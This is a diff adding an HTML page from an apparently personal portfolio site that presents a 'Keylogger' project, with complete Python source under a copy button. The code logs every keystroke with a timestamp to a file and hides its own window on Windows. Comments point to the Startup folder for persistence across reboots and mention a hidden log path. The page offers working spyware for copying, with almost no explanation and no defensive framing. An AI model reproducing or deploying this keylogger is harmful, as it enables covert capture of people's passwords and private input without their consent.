@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Project</title>
+    <link rel="stylesheet" href="project.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.2/gsap.min.js"></script>
+</head>
+<body>
+    <nav class="nav-menu">
+        <div class="menu-toggle" onclick="toggleMenu()">☰</div>
+        <div class="nav-items" id="navItems">
+            <a href="ctf.html" >CTF</a>
+            <a href="project.html" >Projects</a>
+            <a href="cert.html" >Certificates</a>
+        </div>
+    </nav>
+    <header class="main-header">
+        <h1>TJ Projects</h1>
+        <p>Showcase of Personal Projects</p>
+    </header>
+
+    <main class="container">
+        <section class="project-details">
+            <h2>Project Title: Keylogger</h2>
+            <div class="project-description">
+                <h3>Description</h3>
+                <p>The action of recording (logging) the keys struck on a keyboard</p>
+            </div>
+
+            <div class="project-steps">
+                <h3>Implementation Steps</h3>
+                <ol>
+                    <li>Require Python</li>
+                    <li>Coding understanbility (optional)</li>
+                    <li>A windows system</li>
+                    
+                </ol>
+            </div>
+        </section>
+
+        <section class="source-code">
+            <div class="code-header">
+                <h3>Source Code</h3>
+                <button class="copy-btn">📋 Copy</button>
+            </div>
+            <pre><code class="language-javascript">
+import sys
+import os
+from pynput import keyboard
+from datetime import datetime
+
+#Persist Across Reboots:
+#Add the script to the Startup folder:
+#C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startupss
+
+# Configuration
+#LOG_FILE = os.path.expanduser("~/.keystrokes.log")  # Hidden log file
+LOG_FILE = "keyloggeroutput.txt" # Enter file path here
+
+def on_press(key):
+    try:
+        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        with open(LOG_FILE, "a") as f:
+            f.write(f"{timestamp} - {key.char}\n")
+    except AttributeError:
+        # Handle special keys (e.g., Shift, Ctrl)
+        with open(LOG_FILE, "a") as f:
+            f.write(f"{timestamp} - {key}\n")
+
+def hide_script():
+    # Hide the script window (Windows-specific)
+    if sys.platform == "win32":
+        import win32gui, win32con
+        win32gui.ShowWindow(win32gui.GetForegroundWindow(), win32con.SW_HIDE)
+
+if __name__ == "__main__":
+    hide_script()  # Hide the window
+    with keyboard.Listener(on_press=on_press) as listener:
+        listener.join()
+            </code></pre>
+            <button class="preview-btn">▶ Preview Project</button>
+        </section>
+    </main>
+
+    <!-- Video Preview Modal -->
+    <div class="video-modal">
+        <div class="modal-content">
+            <span class="close-modal">&times;</span>
+            <video controls id="project-video">
+                <source src="video.mp4" type="video/mp4">
+                Your browser does not support the video tag.
+            </video>
+        </div>
+    </div>
+
+    <script src="project.js"></script>
+</body>
+</html>
